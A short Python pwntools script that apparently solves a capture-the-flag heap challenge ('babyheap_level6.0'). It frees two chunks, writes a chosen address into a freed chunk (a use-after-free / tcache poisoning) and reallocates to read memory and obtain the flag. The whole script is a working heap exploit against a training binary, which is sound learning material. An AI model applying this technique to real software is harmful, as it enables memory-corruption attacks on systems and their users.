# Nagib Lakhdari 3si2
#!/usr/bin/env python3

from pwn import *

# Start the process for the challenge binary
p = process('/challenge/babyheap_level6.0')

# Send commands to the process
p.sendline(b'malloc')      # Allocate memory
p.sendline(b'0')           # Index for the first memory allocation
p.sendline(b'32')          # Size of the first memory allocation

p.sendline(b'malloc')      # Allocate another memory block
p.sendline(b'1')           # Index for the second memory allocation
p.sendline(b'32')          # Size of the second memory allocation

p.sendline(b'free')        # Free the first allocated memory block
p.sendline(b'0')           # Index of the first memory block

p.sendline(b'free')        # Free the second allocated memory block
p.sendline(b'1')           # Index of the second memory block

p.sendline(b'scanf')       # Use scanf to read input into the freed memory
p.sendline(b'1')           # Index for the scanf command
p.sendline(p64(0x42796f))  # Send input to scanf (address 0x42796f)

p.sendline(b'malloc')      # Allocate memory again
p.sendline(b'0')           # Index for the first memory allocation
p.sendline(b'32')          # Size of the first memory allocation

p.sendline(b'malloc')      # Allocate another memory block
p.sendline(b'1')           # Index for the second memory allocation
p.sendline(b'32')          # Size of the second memory allocation

p.sendline(b'puts')        # Print the content of the memory
p.sendline(b'1')           # Index to print

p.sendline(b'send_flag')   # Send the flag

# Interact with the process to get the output
p.interactive()
